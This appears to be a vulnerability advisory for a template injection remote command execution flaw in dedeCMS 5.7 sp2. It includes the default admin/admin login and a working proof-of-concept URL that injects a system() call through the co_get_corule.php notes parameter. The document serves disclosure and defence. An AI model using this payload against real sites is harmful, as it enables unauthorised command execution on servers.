## Title: Template injection command execution vulnerability in dedeCMS 5.7 sp2

**BUG_Author:** Ewoji

**Affected Version:**  dedeCMS < 5.7.2

**Vendor:** [Shanghai Zhuozhuo Network Technology Co., LTD](https://www.dedecms.com/)

**Software:** [dedeCMS](https://www.dedecms.com/download#download)

**Vulnerability Files:**
- `/include/dedetag.class.php`

## Description:

1. **After install，Log in to the background**
   - Use the default account password admin/admin

2. **Exploiting the Template**
   - Access the dede/co_get_corule.php interface
   - Pass in the parameter /dede/co_get_corule.php? notes={dede:"); system('calc'); ///}&job=1,Accessing twice like this can execute the command

3. **Verifying the Exploit:**
   - If the injection is successful,The attacker will execute arbitrary commands

## Proof of Concept:

   ```
   /dede/co_get_corule.php?notes={dede:");system('calc');///}&job=1
   Accessing twice like this can execute the command
   ```
detail:[CVE-2025-6335-dedeCMS后台模板注入RCE](https://ewoji.cn/2025/06/20/CVE-2025-6335-dedeCMS%E5%90%8E%E5%8F%B0%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5RCE/)
